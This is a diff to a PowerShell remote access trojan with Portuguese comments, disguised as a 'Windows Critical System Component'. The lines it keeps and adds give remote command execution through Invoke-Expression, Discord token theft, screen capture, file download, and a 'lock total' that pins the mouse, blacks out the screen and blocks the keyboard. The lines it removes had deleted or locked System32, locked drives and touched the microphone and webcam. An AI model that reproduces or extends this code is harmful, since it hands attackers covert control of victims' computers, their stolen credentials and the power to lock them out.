@@ -2,9 +2,9 @@
 .SYNOPSIS
 Windows Critical System Component - Complete Edition
 .DESCRIPTION
-Funções completas para controle remoto e destruição
+Funções completas para controle remoto e lock total
 .NOTES
-Versão: 10.0.19045.1 - Ultimate Edition
+Versão: 10.0.19045.1 - Lock Edition
 #>
 
 # ===== CONFIGURACOES =====
@@ -16,8 +16,7 @@ $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUp
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
 $debugLog = "$env:TEMP\rat_debug.log"
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-$wallpaperPath = "$env:TEMP\wallpaper_downloaded.bmp"
-$tempImagePath = "$env:TEMP\wallpaper_temp.jpg"
+$wallpaperPath = "$env:TEMP\wallpaper_temp.bmp"
 
 # ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
@@ -175,184 +174,6 @@ if (-not (Test-Path $scriptPath)) {
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# ===== FUNÇÃO PARA BAIXAR IMAGEM DA INTERNET =====
-function Download-Image {
-    param([string]$ImageUrl)
-    
-    try {
-        Write-DebugLog "Baixando imagem de: $ImageUrl"
-        
-        # Baixar imagem
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($ImageUrl, $tempImagePath)
-        $webClient.Dispose()
-        
-        Write-DebugLog "Imagem baixada para: $tempImagePath"
-        
-        # Converter para BMP se necessário
-        if (Test-Path $tempImagePath) {
-            try {
-                $img = [System.Drawing.Image]::FromFile($tempImagePath)
-                $img.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
-                $img.Dispose()
-                
-                Remove-Item $tempImagePath -Force
-                Write-DebugLog "Imagem convertida para BMP: $wallpaperPath"
-                return $true
-            } catch {
-                Write-DebugLog "Erro ao converter imagem: $_"
-                return $false
-            }
-        }
-        
-        return $false
-    } catch {
-        Write-DebugLog "Erro ao baixar imagem: $_"
-        return $false
-    }
-}
-
-# ===== FUNÇÃO PARA ALTERAR WALLPAPER =====
-function Set-Wallpaper {
-    try {
-        Write-DebugLog "Aplicando wallpaper no sistema"
-        
-        $code = @'
-using System;
-using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    
-    public static void Set(string path) {
-        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
-    }
-}
-'@
-        Add-Type -TypeDefinition $code -ErrorAction Stop
-        [Wallpaper]::Set($wallpaperPath)
-        
-        Write-DebugLog "Wallpaper aplicado com sucesso"
-        return $true
-    } catch {
-        Write-DebugLog "Erro ao aplicar wallpaper: $_"
-        return $false
-    }
-}
-
-# ===== FUNÇÃO PARA ALTERAR WALLPAPER POR LINK =====
-function Set-WallpaperFromUrl {
-    param([string]$ImageUrl)
-    
-    try {
-        Write-DebugLog "=" * 60
-        Write-DebugLog "ALTERANDO WALLPAPER VIA LINK"
-        Write-DebugLog "Link: $ImageUrl"
-        Write-DebugLog "=" * 60
-        
-        # Baixar imagem
-        if (Download-Image -ImageUrl $ImageUrl) {
-            # Aplicar wallpaper
-            if (Set-Wallpaper) {
-                Write-DebugLog "=" * 60
-                Write-DebugLog "WALLPAPER ALTERADO COM SUCESSO"
-                Write-DebugLog "=" * 60
-                return "WALLPAPER_SET_FROM_URL"
-            } else {
-                return "WALLPAPER_APPLY_ERROR"
-            }
-        } else {
-            return "WALLPAPER_DOWNLOAD_ERROR"
-        }
-    } catch {
-        Write-DebugLog "ERRO ao alterar wallpaper via link: $_"
-        return "WALLPAPER_ERROR"
-    }
-}
-
-# ===== FUNÇÃO LOCK TOTAL =====
-$global:lockActive = $false
-$global:mouseLockThread = $null
-
-function Activate-Lock {
-    try {
-        if ($global:lockActive) { return "LOCK_ALREADY_ACTIVE" }
-        
-        Write-DebugLog "=" * 60
-        Write-DebugLog "ATIVANDO LOCK TOTAL"
-        Write-DebugLog "=" * 60
-        
-        $global:lockActive = $true
-        
-        # 1. Travar mouse
-        $global:mouseLockThread = [System.Threading.Thread]::new({
-            while ($global:lockActive) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 5
-                } catch {}
-            }
-        })
-        $global:mouseLockThread.IsBackground = $true
-        $global:mouseLockThread.Start()
-        
-        # 2. Tela preta
-        $ps = [powershell]::Create()
-        [void]$ps.AddScript({
-            Add-Type -AssemblyName System.Windows.Forms
-            $form = New-Object System.Windows.Forms.Form
-            $form.WindowState = 'Maximized'
-            $form.FormBorderStyle = 'None'
-            $form.TopMost = $true
-            $form.BackColor = 'Black'
-            $form.ControlBox = $false
-            $form.ShowInTaskbar = $false
-            $form.KeyPreview = $true
-            $form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $form.Close() } })
-            $form.ShowDialog()
-        })
-        $ps.BeginInvoke()
-        
-        Write-DebugLog "=" * 60
-        Write-DebugLog "LOCK TOTAL ATIVADO COM SUCESSO"
-        Write-DebugLog "=" * 60
-        
-        return "LOCK_ACTIVATED"
-    } catch {
-        Write-DebugLog "ERRO ao ativar lock total: $_"
-        return "LOCK_ERROR"
-    }
-}
-
-function Deactivate-Lock {
-    try {
-        Write-DebugLog "=" * 60
-        Write-DebugLog "DESATIVANDO LOCK TOTAL"
-        Write-DebugLog "=" * 60
-        
-        $global:lockActive = $false
-        
-        # Fechar tela preta
-        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
-            $_.Close()
-        }
-        
-        # Parar thread do mouse
-        if ($global:mouseLockThread -and $global:mouseLockThread.IsAlive) {
-            $global:mouseLockThread.Abort()
-        }
-        
-        Write-DebugLog "=" * 60
-        Write-DebugLog "LOCK TOTAL DESATIVADO"
-        Write-DebugLog "=" * 60
-        
-        return "LOCK_DEACTIVATED"
-    } catch {
-        Write-DebugLog "ERRO ao desativar lock total: $_"
-        return "UNLOCK_ERROR"
-    }
-}
-
 # ===== CAPTURA DE TELA =====
 function Get-ScreenCapture {
     try {
@@ -374,6 +195,50 @@ function Get-ScreenCapture {
     }
 }
 
+# ===== FUNÇÃO PARA WALLPAPER =====
+function Set-WallpaperFromUrl {
+    param([string]$ImageUrl)
+    
+    try {
+        Write-DebugLog "=" * 60
+        Write-DebugLog "BAIXANDO IMAGEM: $ImageUrl"
+        Write-DebugLog "=" * 60
+        
+        $webClient = New-Object System.Net.WebClient
+        $tempFile = "$env:TEMP\wallpaper_download.jpg"
+        $webClient.DownloadFile($ImageUrl, $tempFile)
+        $webClient.Dispose()
+        
+        if (-not (Test-Path $tempFile)) {
+            return "WALLPAPER_DOWNLOAD_ERROR"
+        }
+        
+        $img = [System.Drawing.Image]::FromFile($tempFile)
+        $img.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
+        $img.Dispose()
+        Remove-Item $tempFile -Force
+        
+        $code = @'
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    public static void Set(string path) {
+        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
+    }
+}
+'@
+        Add-Type -TypeDefinition $code -ErrorAction Stop
+        [Wallpaper]::Set($wallpaperPath)
+        
+        return "WALLPAPER_SET_FROM_URL"
+    } catch {
+        Write-DebugLog "ERRO ao alterar wallpaper: $_"
+        return "WALLPAPER_ERROR"
+    }
+}
+
 # ===== MOUSE =====
 function Move-Mouse { 
     param($x, $y)
@@ -381,7 +246,6 @@ function Move-Mouse {
         [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
         return "OK"
     } catch { 
-        Write-DebugLog "Erro ao mover mouse: $_"
         return "MOUSE_ERROR" 
     }
 }
@@ -391,7 +255,6 @@ function Click-Mouse {
         [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
         return "OK"
     } catch { 
-        Write-DebugLog "Erro ao clicar: $_"
         return "CLICK_ERROR" 
     }
 }
@@ -401,7 +264,6 @@ function RightClick-Mouse {
         [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
         return "OK"
     } catch { 
-        Write-DebugLog "Erro ao clicar direito: $_"
         return "RIGHTCLICK_ERROR" 
     }
 }
@@ -413,7 +275,6 @@ function Send-Key {
         [System.Windows.Forms.SendKeys]::SendWait($key)
         return "OK"
     } catch { 
-        Write-DebugLog "Erro ao enviar tecla: $_"
         return "KEY_ERROR" 
     }
 }
@@ -424,7 +285,6 @@ function Send-Text {
         [System.Windows.Forms.SendKeys]::SendWait($text)
         return "OK"
     } catch { 
-        Write-DebugLog "Erro ao enviar texto: $_"
         return "TEXT_ERROR" 
     }
 }
@@ -441,7 +301,6 @@ function Get-FileList {
         }
         return ($items | ConvertTo-Json -Compress)
     } catch { 
-        Write-DebugLog "Erro ao listar arquivos: $_"
         return "[]" 
     }
 }
@@ -455,7 +314,6 @@ function Download-File {
         }
         return "FILE_NOT_FOUND"
     } catch { 
-        Write-DebugLog "Erro ao baixar arquivo: $_"
         return "DOWNLOAD_ERROR" 
     }
 }
@@ -467,7 +325,6 @@ function Execute-Command {
         $result = Invoke-Expression $Cmd 2>&1 | Out-String
         return $result
     } catch {
-        Write-DebugLog "Erro ao executar comando: $_"
         return "Erro: $_"
     }
 }
@@ -479,9 +336,7 @@ function Get-DiscordToken {
         $paths = @(
             "$env:APPDATA\discord\Local Storage\leveldb",
             "$env:APPDATA\discordptb\Local Storage\leveldb",
-            "$env:APPDATA\discordcanary\Local Storage\leveldb",
-            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
-            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
+            "$env:APPDATA\discordcanary\Local Storage\leveldb"
         )
         foreach ($path in $paths) {
             if (Test-Path $path) {
@@ -495,187 +350,9 @@ function Get-DiscordToken {
         }
         $tokens = $tokens | Select-Object -Unique
         if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
-        Write-DebugLog "Tokens encontrados: $($tokens.Count)"
         return "TOKENS:" + ($tokens -join "`n")
     } catch {
-        Write-DebugLog "Erro ao obter tokens: $_"
         return "TOKENS_ERROR"
-    }
-}
-
-# ===== BLOQUEAR SYSTEM32 =====
-function Block-System32 {
-    try {
-        Write-DebugLog "Iniciando Block-System32"
-        $path = "C:\Windows\System32"
-        
-        takeown /f $path /r /d y 2>$null
-        icacls $path /grant Administradores:F /t 2>$null
-        
-        $acl = Get-Acl $path
-        $acl.SetAccessRuleProtection($true, $false)
-        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
-        $acl.AddAccessRule($accessRule)
-        Set-Acl $path $acl
-        
-        Write-DebugLog "System32 bloqueado com sucesso"
-        return "SYSTEM32_BLOCKED"
-    } catch {
-        Write-DebugLog "Erro ao bloquear System32: $_"
-        return "SYSTEM32_ERROR"
-    }
-}
-
-# ===== APAGAR SYSTEM32 =====
-function Delete-System32 {
-    try {
-        Write-DebugLog "Iniciando Delete-System32"
-        $path = "C:\Windows\System32"
-        
-        if (Test-Path $path) {
-            takeown /f $path /r /d y 2>$null
-            icacls $path /grant Administradores:F /t 2>$null
-            
-            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
-            
-            if (-not (Test-Path $path)) {
-                Write-DebugLog "System32 apagado com sucesso"
-                return "SYSTEM32_DELETED"
-            } else {
-                $newName = "C:\Windows\System32_old_$(Get-Random)"
-                Rename-Item -Path $path -NewName $newName -Force -ErrorAction SilentlyContinue
-                if (-not (Test-Path $path)) {
-                    Write-DebugLog "System32 renomeado com sucesso"
-                    return "SYSTEM32_RENAMED"
-                } else {
-                    return "SYSTEM32_DELETE_FAILED"
-                }
-            }
-        } else {
-            return "SYSTEM32_NOT_FOUND"
-        }
-    } catch {
-        Write-DebugLog "Erro ao apagar System32: $_"
-        return "SYSTEM32_ERROR"
-    }
-}
-
-# ===== TRAVAR DISCOS =====
-function Lock-Drives {
-    param([string[]]$Drives = @("C:", "D:"))
-    $results = @()
-    foreach ($drive in $Drives) {
-        try {
-            Write-DebugLog "Travando drive ${drive}"
-            $path = "${drive}\"
-            if (Test-Path $path) {
-                $acl = Get-Acl $path
-                $acl.SetAccessRuleProtection($true, $false)
-                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Deny")
-                $acl.AddAccessRule($accessRule)
-                $accessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Write", "Deny")
-                $acl.AddAccessRule($accessRule2)
-                Set-Acl $path $acl
-                
-                $results += "${drive} travado"
-                Write-DebugLog "Drive ${drive} travado"
-            } else {
-                $results += "${drive} não encontrado"
-                Write-DebugLog "Drive ${drive} não encontrado"
-            }
-        } catch {
-            Write-DebugLog "Erro ao travar drive ${drive}: $($_.Exception.Message)"
-            $results += "${drive} erro"
-        }
-    }
-    return "DRIVES_LOCKED:" + ($results -join ";")
-}
-
-# ===== LIBERAR DISCOS =====
-function Unlock-Drives {
-    param([string[]]$Drives = @("C:", "D:"))
-    $results = @()
-    foreach ($drive in $Drives) {
-        try {
-            Write-DebugLog "Liberando drive ${drive}"
-            $path = "${drive}\"
-            
-            if (Test-Path $path) {
-                $acl = Get-Acl $path
-                $acl.SetAccessRuleProtection($false, $true)
-                
-                $rulesToRemove = @()
-                foreach ($rule in $acl.Access) {
-                    if ($rule.IdentityReference -eq "Everyone" -and $rule.AccessControlType -eq "Deny") {
-                        $rulesToRemove += $rule
-                    }
-                }
-                
-                foreach ($rule in $rulesToRemove) {
-                    $acl.RemoveAccessRule($rule) | Out-Null
-                }
-                
-                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
-                $acl.AddAccessRule($accessRule)
-                Set-Acl $path $acl
-                
-                $results += "${drive} liberado"
-                Write-DebugLog "Drive ${drive} liberado"
-            } else {
-                $results += "${drive} não encontrado"
-                Write-DebugLog "Drive ${drive} não encontrado"
-            }
-        } catch {
-            Write-DebugLog "Erro ao liberar drive ${drive}: $($_.Exception.Message)"
-            $results += "${drive} erro"
-        }
-    }
-    return "DRIVES_UNLOCKED:" + ($results -join ";")
-}
-
-# ===== MICROFONE =====
-function Get-Microphone {
-    try {
-        Add-Type -AssemblyName System.Speech
-        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-        $speech.SetInputToDefaultAudioDevice()
-        $speech.RecognizeAsyncTimeout = 5000
-        $speech.RecognizeAsync()
-        Start-Sleep -Seconds 5
-        $speech.RecognizeAsyncStop()
-        Write-DebugLog "Microfone gravado"
-        return "AUDIO:OK"
-    } catch {
-        Write-DebugLog "Erro no microfone: $_"
-        return "AUDIO_ERROR"
-    }
-}
-
-# ===== WEBCAM =====
-function Get-Webcam {
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        
-        $webcam = New-Object System.Windows.Forms.Panel
-        $webcam.Size = New-Object System.Drawing.Size(640, 480)
-        $webcam.BackColor = 'Black'
-        
-        $form = New-Object System.Windows.Forms.Form
-        $form.Text = "Webcam"
-        $form.Size = New-Object System.Drawing.Size(660, 520)
-        $form.Controls.Add($webcam)
-        $form.Show()
-        $form.TopMost = $true
-        
-        Start-Sleep -Milliseconds 500
-        $form.Close()
-        
-        Write-DebugLog "Webcam ativada"
-        return "WEBCAM:OK"
-    } catch {
-        Write-DebugLog "Erro na webcam: $_"
-        return "WEBCAM_ERROR"
     }
 }
 
@@ -685,7 +362,6 @@ function Get-ProcessList {
         $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
         return $processes
     } catch {
-        Write-DebugLog "Erro ao listar processos: $_"
         return "PROCESS_ERROR"
     }
 }
@@ -695,10 +371,8 @@ function Open-Url {
     param($url)
     try {
         Start-Process $url
-        Write-DebugLog "URL aberta: $url"
         return "URL_OPENED"
     } catch {
-        Write-DebugLog "Erro ao abrir URL: $_"
         return "URL_ERROR"
     }
 }
@@ -711,11 +385,174 @@ function Power-Control {
             "shutdown" { Stop-Computer -Force }
             "reboot" { Restart-Computer -Force }
         }
-        Write-DebugLog "Comando de energia: $Action"
         return "POWER_$Action"
     } catch { 
-        Write-DebugLog "Erro no comando de energia: $_"
         return "POWER_ERROR" 
+    }
+}
+
+# ===== FUNÇÕES DE LOCK =====
+
+# Variáveis globais para controle de lock
+$script:mouseLocked = $false
+$script:mouseThread = $null
+$script:blackScreenForm = $null
+$script:keyboardHook = $null
+$script:lockActive = $false
+
+# TRAVAR MOUSE
+function Lock-Mouse {
+    try {
+        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
+        
+        $script:mouseLocked = $true
+        $script:mouseThread = [System.Threading.Thread]::new({
+            while ($script:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 5
+                } catch {}
+            }
+        })
+        $script:mouseThread.IsBackground = $true
+        $script:mouseThread.Start()
+        
+        return "MOUSE_LOCKED"
+    } catch {
+        return "MOUSE_ERROR"
+    }
+}
+
+function Unlock-Mouse {
+    try {
+        $script:mouseLocked = $false
+        if ($script:mouseThread -and $script:mouseThread.IsAlive) {
+            $script:mouseThread.Abort()
+        }
+        return "MOUSE_UNLOCKED"
+    } catch {
+        return "MOUSE_UNLOCK_ERROR"
+    }
+}
+
+# TELA PRETA
+function Black-Screen {
+    try {
+        $ps = [powershell]::Create()
+        [void]$ps.AddScript({
+            Add-Type -AssemblyName System.Windows.Forms
+            $form = New-Object System.Windows.Forms.Form
+            $form.WindowState = 'Maximized'
+            $form.FormBorderStyle = 'None'
+            $form.TopMost = $true
+            $form.BackColor = 'Black'
+            $form.ControlBox = $false
+            $form.ShowInTaskbar = $false
+            $form.KeyPreview = $true
+            $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
+            $form.ShowDialog()
+        })
+        $ps.BeginInvoke()
+        return "BLACK_SCREEN_ACTIVATED"
+    } catch {
+        return "BLACK_SCREEN_ERROR"
+    }
+}
+
+function Unlock-Screen {
+    try {
+        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
+            $_.Close()
+        }
+        return "BLACK_SCREEN_DEACTIVATED"
+    } catch {
+        return "UNLOCK_SCREEN_ERROR"
+    }
+}
+
+# TRAVAR TECLADO
+function Lock-Keyboard {
+    try {
+        $keyboardCode = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+public class KeyboardLocker {
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    public static void Lock() {
+        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
+        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
+            _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+    
+    public static void Unlock() {
+        if (_hookID != IntPtr.Zero) {
+            UnhookWindowsHookEx(_hookID);
+            _hookID = IntPtr.Zero;
+        }
+    }
+    
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        return (IntPtr)1;
+    }
+}
+'@
+        Add-Type -TypeDefinition $keyboardCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+        [KeyboardLocker]::Lock()
+        return "KEYBOARD_LOCKED"
+    } catch {
+        return "KEYBOARD_ERROR"
+    }
+}
+
+function Unlock-Keyboard {
+    try {
+        [KeyboardLocker]::Unlock()
+        return "KEYBOARD_UNLOCKED"
+    } catch {
+        return "KEYBOARD_UNLOCK_ERROR"
+    }
+}
+
+# LOCK TOTAL (TUDO JUNTO)
+function Lock-Total {
+    try {
+        Lock-Mouse | Out-Null
+        Black-Screen | Out-Null
+        Lock-Keyboard | Out-Null
+        $script:lockActive = $true
+        return "LOCK_TOTAL_ACTIVATED"
+    } catch {
+        return "LOCK_TOTAL_ERROR"
+    }
+}
+
+function Unlock-Total {
+    try {
+        Unlock-Mouse | Out-Null
+        Unlock-Screen | Out-Null
+        Unlock-Keyboard | Out-Null
+        $script:lockActive = $false
+        return "LOCK_TOTAL_DEACTIVATED"
+    } catch {
+        return "UNLOCK_TOTAL_ERROR"
     }
 }
 
@@ -746,22 +583,6 @@ while ($true) {
                 $writer.WriteLine((RightClick-Mouse))
             } elseif ($cmd -eq "discord") {
                 $writer.WriteLine((Get-DiscordToken))
-            } elseif ($cmd -eq "block_system32") {
-                $result = Block-System32
-                $writer.WriteLine($result)
-            } elseif ($cmd -eq "delete_system32") {
-                $result = Delete-System32
-                $writer.WriteLine($result)
-            } elseif ($cmd -eq "lock_drives") {
-                $result = Lock-Drives
-                $writer.WriteLine($result)
-            } elseif ($cmd -eq "unlock_drives") {
-                $result = Unlock-Drives
-                $writer.WriteLine($result)
-            } elseif ($cmd -eq "mic") {
-                $writer.WriteLine((Get-Microphone))
-            } elseif ($cmd -eq "webcam") {
-                $writer.WriteLine((Get-Webcam))
             } elseif ($cmd -eq "processes") {
                 $writer.WriteLine((Get-ProcessList))
             } elseif ($cmd -eq "shutdown") {
@@ -772,12 +593,22 @@ while ($true) {
                 $writer.WriteLine((Get-RATUsers))
             } elseif ($cmd -eq "remove_current_user") {
                 $writer.WriteLine((Remove-UserFromRAT $currentUser))
-            } elseif ($cmd -eq "activate_lock") {
-                $result = Activate-Lock
-                $writer.WriteLine($result)
-            } elseif ($cmd -eq "deactivate_lock") {
-                $result = Deactivate-Lock
-                $writer.WriteLine($result)
+            } elseif ($cmd -eq "lock_mouse") {
+                $writer.WriteLine((Lock-Mouse))
+            } elseif ($cmd -eq "unlock_mouse") {
+                $writer.WriteLine((Unlock-Mouse))
+            } elseif ($cmd -eq "black_screen") {
+                $writer.WriteLine((Black-Screen))
+            } elseif ($cmd -eq "unlock_screen") {
+                $writer.WriteLine((Unlock-Screen))
+            } elseif ($cmd -eq "lock_keyboard") {
+                $writer.WriteLine((Lock-Keyboard))
+            } elseif ($cmd -eq "unlock_keyboard") {
+                $writer.WriteLine((Unlock-Keyboard))
+            } elseif ($cmd -eq "lock_total") {
+                $writer.WriteLine((Lock-Total))
+            } elseif ($cmd -eq "unlock_total") {
+                $writer.WriteLine((Unlock-Total))
             } elseif ($cmd -match "^set_wallpaper (.+)$") {
                 $url = $matches[1]
                 $result = Set-WallpaperFromUrl -ImageUrl $url
